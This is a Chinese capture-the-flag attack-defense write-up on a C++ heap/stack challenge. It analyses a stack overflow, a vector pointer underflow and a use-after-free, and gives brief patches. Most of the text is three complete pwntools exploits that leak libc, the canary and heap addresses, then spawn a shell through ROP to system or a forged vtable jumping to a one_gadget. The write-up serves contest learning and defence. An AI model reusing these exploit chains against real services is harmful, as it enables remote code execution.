# tiangou

舔狗舔到最后一无所有.jpg

这是唯一解出来的题，找到了3个漏洞，(貌似还有一个

题目环境是`ubuntu16.04,libc2.23`

- 漏洞1

```c
unsigned __int64 show()
{
  size_t v0; // rbx
  const void *v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v7; // [rsp+0h] [rbp-170h]
  __int64 v8; // [rsp+10h] [rbp-160h]
  void *v9; // [rsp+20h] [rbp-150h]
  __int64 v10; // [rsp+28h] [rbp-148h]
  char v11; // [rsp+30h] [rbp-140h]
  char dest; // [rsp+50h] [rbp-120h]
  unsigned __int64 v13; // [rsp+158h] [rbp-18h]

  v13 = __readfsqword(0x28u);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v11);
  std::operator<<<std::char_traits<char>>(&std::cout, "Please input your name first: ");
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v11);
  v0 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::size(&v11);
  v1 = (const void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(&v11);
  memcpy(&dest, v1, v0);	//!!!!!

```

很明显的一个栈溢出

exp1为:

```python
from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil("Input number: ",timeout=2)
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)
def show(name):
	cmd(1)
	p.recvuntil("Please input your name first: ",timeout=2)
	p.sendline(name)
def dele(idx):
	cmd(2)
	p.recvuntil("Idx: ")
	p.sendline(str(idx))

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./tiangou")
		# p = process("./note_29",env={"LD_PRELOAD":"./libc.so.6"})
		gdb.attach(p,"b *0x0000000000401695")
	show("a"*0x3f+'-')
	p.recvuntil('-')
	libc.address = u64(p.recv(6).ljust(8,"\x00")) - 0x95e7c0
	show("a"*0x68+'-')
	p.recvuntil('-')
	canary = u64('\x00'+p.recv(7))
	info("libc: " + hex(libc.address))
	show("A"*0x108+'\x00')
	info("canary:" + hex(canary))
	# show("A"*0x)
	show("A"*0x108+p64(canary)+"\x00"*0x18+p64(0x404023)+p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"]))
	
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	main(args["REMOTE"])
	
```

exp1打了挺多轮的,但是不知道为什么有些队伍能打通,有些打不通,我自己的程序啥也没动,远程就是打不通,(运气好,苟住

修补的话我是改成了`memcpy`固定长度就好了

```
v12 = __readfsqword(0x28u);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v10);
  std::operator<<<std::char_traits<char>>(&std::cout, "Please input your name first: ");
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v10);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::size(&v10);
  v0 = (const void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(&v10);
  memcpy(&dest, v0, 0x108uLL);
```

- 漏洞2

这题是c++写的,还好原先逆向过一些c++写的程序,这题逆向起来不是很难,(我一定好好学c++.jpg



```c
 switch ( get_choice() )
  {
    case 1LL:                                   // EProduct
      v1 = (EProduct *)operator new(0x130uLL);
      sub_401F82(v1);
      v8 = &v1->item_base.vtables;
      goto LABEL_8;
    case 2LL:                                   // Food
      v2 = (Food *)operator new(0x38uLL);
      sub_4021D4(v2);
      v8 = &v2->item_base.vtables;
      goto LABEL_8;
    case 3LL:                                   // Snack
      v3 = (_QWORD *)operator new(0x50uLL);
      memset(v3, 0, 0x50uLL);
      sub_4026D8(v3);
      v8 = v3;
      goto LABEL_8;
    case 4LL:                                   // KitchenSet
      v4 = (_QWORD *)operator new(0x38uLL);
      sub_402648(v4);
```

`Snack`的`edit`函数里的

```c
  while ( 1 )
        {
          std::operator<<<std::char_traits<char>>(&std::cout, "What do you want to do: \n");
          std::operator<<<std::char_traits<char>>(&std::cout, "Add a kind of snack\n");
          std::operator<<<std::char_traits<char>>(&std::cout, "Rm a kind of snack\n");
          std::operator<<<std::char_traits<char>>(&std::cout, "Calucate snack\n");
          std::operator<<<std::char_traits<char>>(&std::cout, "Return\n");
          v1 = get_choice();
          if ( v1 != 2 )
            break;
          rm_kind(&a1->kind_vec);		//!!!!
```

`rm_kind`函数有`bug`,点进去可以看到

```c
void __fastcall rm_kind(vector_1 *a1)
{
  a1->current -= 8LL;    //!!!!
  sub_402C8E((__int64)a1, a1->current);
}
```

这里我分析的`Snack`类为

```c
000000 Snack           struc ; (sizeof=0x50, mappedto_10)
00000000 vtables         dq ?
00000008 name_ptr        dq ?
00000010 current_len     dq ?
00000018 max_len         dq ?
00000020 padding         dq ?
00000028 num             dq ?
00000030 caluli          dq ?
00000038 kind_vec        vector_1 ?
00000050 Snack           ends
```

`rm_kind`操作的就是`Snack`类里的`kind_vec`

然后`vector`是

```c
00000000 vector_1        struc ; (sizeof=0x18, mappedto_7)
00000000                                         ; XREF: .bss:vector/r
00000000                                         ; sub_40289C/r ...
00000000 start           dq ?                    ; XREF: sub_40289C+32/r
00000008 current         dq ?                    ; XREF: sub_40289C+15/w
00000008                                         ; sub_40289C+36/r
00000010 end             dq ?
00000018 vector_1        ends
```

所以`rm_kind`一直递减`kind_vec`里的`current`指针,我们可以在`Snack`上面先创建一个对象，因为对象都分配在堆里,这个`kind_vec->current`也是指向堆里，然后利用这个漏洞伪造上一个对象的`name`字段,泄露`libc`和`heap`地址,最后在伪造`vtable`跳转到`one_gadget`

exp2为:

```python

from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil("Input number: ")
	p.sendline(str(command))
def add(choice,name,num):
	cmd(2)
	p.recvuntil("What do you want to buy:")
	p.sendline(str(choice))
	p.recvuntil("Name: ")
	p.sendline(name)
	p.recvuntil("Input number: ")
	p.sendline(str(num))
def show(name):
	cmd(1)
	p.recvuntil("Please input your name first: ")
	p.sendline(name)
def dele(num):
	cmd(4)
	p.recvuntil("Input number: ")
	p.sendline(str(num))

def edit(num,name):
	cmd(3)
	p.recvuntil("Input number: ")
	p.sendline(str(num))
	p.recvuntil("Name: ")
	p.sendline(name)

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./tiangou")
		# gdb.attach(p,"b *0x0000000000401695")
		gdb.attach(p)
	add(1,"aaaaaaaa",0xcafebabe)
	add(3,"aaa",0xdeadbeef)
	cmd(3)
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(3822))
	for i in range(0x28):
		p.recvuntil("Input number: ")
		p.sendline(str(2))
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(0x000000000607050))
	p.recvuntil("Input number: ")
	p.sendline(str(4))
	show("aaa")
	p.recvuntil("Item list:")
	p.recvuntil("name: ")
	# libc.address = u64(p.recv(6).ljust(8,"\x00")) - libc.symbols["__libc_start_main"]
	libc.address = u64(p.recv(8)) - 0x20740
	info("libc: " + hex(libc.address))
	cmd(3)
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(2))
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(6321496))
	p.recvuntil("Input number: ")
	p.sendline(str(4))
	show("aaa")
	p.recvuntil("name: ")
	heap = u64(p.recv(8))-0x13210
	info("heap: " + hex(heap))
	cmd(3)
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(2))
	p.recvuntil("Input number: ")
	p.sendline(str(2))
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(heap+0x13040))
	p.recvuntil("Input number: ")
	p.sendline(str(1))
	p.recvuntil("Input number: ")
	p.sendline(str(0xf02a4+libc.address))
	p.recvuntil("Input number: ")
	p.sendline(str(4))
	cmd(3)
	p.recvuntil("Input number: ")

	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	main(args["REMOTE"])
	
	
```

这份exp也只能打几队,但总比没得打来的好

修补的话,只要把那个`current-8 nop`掉就好,我当时直接让`rm_kind`返回了

第一天就用了这两个`exp`，（都是抄流量的

晚上回去爆肝又赶出了一份exp3

- 漏洞3

`add_to_chart`选项的`From existing obj`，存在`UAF`，因为这个函数(我觉得应该叫`dup`)是直接把对象的地址拷贝了一份，即有两个指针指向同一个对象,比如我`add,add`,然后`dup`一下

```c
pwndbg> telescope 0x607550
00:0000│   0x607550 —▸ 0xb66100 —▸ 0xb66040 —▸ 0x4043e0 —▸ 0x40261e ◂— ...
01:0008│   0x607558 —▸ 0xb66118 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│   0x607560 —▸ 0xb66120 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│   0x607568 ◂— 0x0
... ↓
pwndbg> telescope 0xb66100
00:0000│   0xb66100 —▸ 0xb66040 —▸ 0x4043e0 —▸ 0x40261e ◂— push   rbp
01:0008│   0xb66108 —▸ 0xb660a0 —▸ 0x4043e0 —▸ 0x40261e ◂— push   rbp
02:0010│   0xb66110 —▸ 0xb66040 —▸ 0x4043e0 —▸ 0x40261e ◂— push   rbp
03:0018│   0xb66118 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓
05:0028│   0xb66128 ◂— 0x1eee1
06:0030│   0xb66130 ◂— 0x4141414141414141 ('AAAAAAAA')
```

然后在`check out`一个就形成了`UAF`，然后就是伪造`name`字段泄露`heap`地址，然后在伪造`vtable`来`getshell`

exp3为：

```python
from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil("Input number: ",timeout=1)
	p.sendline(str(command))
def add(choice,name,num):
	cmd(2)
	p.recvuntil("What do you want to buy:")
	p.sendline(str(choice))
	p.recvuntil("Name: ")
	p.sendline(name)
	p.recvuntil("Input number: ")
	p.sendline(str(num))
def show(name):
	cmd(1)
	p.recvuntil("Please input your name first: ",timeout=1)
	p.sendline(name)
def dele(num):
	cmd(4)
	p.recvuntil("Input number: ")
	p.sendline(str(num))
def edit(num,name):
	cmd(3)
	p.recvuntil("Input number: ")
	p.sendline(str(num))
	p.recvuntil("Name: ")
	p.sendline(name)
def dup(idx):
	cmd(2)
	p.recvuntil("Input number: ")
	p.sendline(str(5))
	p.recvuntil("Input number: ")
	p.sendline(str(idx))

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./tiangou")
		# gdb.attach(p,"b *0x0000000000401695")
		gdb.attach(p)
	add(4,"A"*0x400,32)
	add(4,"A"*0x200,33)
	dup(0)
	dele(2)
	payload = p64(0x4043e0)+p64(0x000000000607050)+p64(0x128)*2+p64(0)
	add(1,payload,34)
	show("ddddhm")
	p.recvuntil("The warranty is until ")
	libc.address = u64(p.recv(6).ljust(8,"\x00"))-0x3c4b78
	info("libc: " + hex(libc.address))
	add(1,"A"*0x200,34)  #3
	dup(3)
	add(1,"a",34)
	dele(5)
	dele(4)
	add(1,"a",34)
	edit(4,"b")
	p.recvuntil("Input number: ")
	p.sendline(str(777))
	payload = p64(0x404480)+p64(0x000000000607550)
	payload += p64(0x18)*2
	payload = payload.ljust(0x100,"\x00")
	p.send(payload)
	show("want_a_girl_friend")
	p.recvuntil("The warranty is until ")
	p.recvuntil("Name: ",timeout=2)
	heap = u64(p.recv(8))-0x13270
	info("heap: " + hex(heap))
	fake_vt = heap+0x13300
	payload = p64(fake_vt)+p64(0)+p64(0xf1147+libc.address)*4
	payload = payload.ljust(0x100,"\x00")
	edit(4,"b")
	p.recvuntil("Input number: ")
	p.sendline(str(777))
	p.send(payload)
	show("\x00"*0x50)

	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	main(args["REMOTE"])
```

这份`exp`第二天一早打起来爽啊，打了好多只队伍，但是不知道为什么还是被`Lancet`和`0ops`锤，不知道他们怎么打的这题orz,加分又扣分，导致一轮也没加几分

然后还有一个`bug`是`KitchenSet`的构造函数把，我也不知道是不是构造函数，就是询问名字的那个函数，

```c
KitchenSet *__fastcall sub_40261E(KitchenSet *a1, __int64 a2)
{
  __int64 v2; // rdx
  KitchenSet *result; // rax

  v2 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(a2);		//!!!
  result = a1;
  a1->name = v2;
  return result;
}
```

直接把`string`类的`c_str`赋值给对象的`name`字段，这样返回的时候，`string`类会释放，但是`KitchenSet`还是会留着指针，应该可以拿来泄露，没找到利用方式wtcl

题目质量挺好的，给力哦带哥，然后剩下的两题`pwn`第二天被暴打，orz

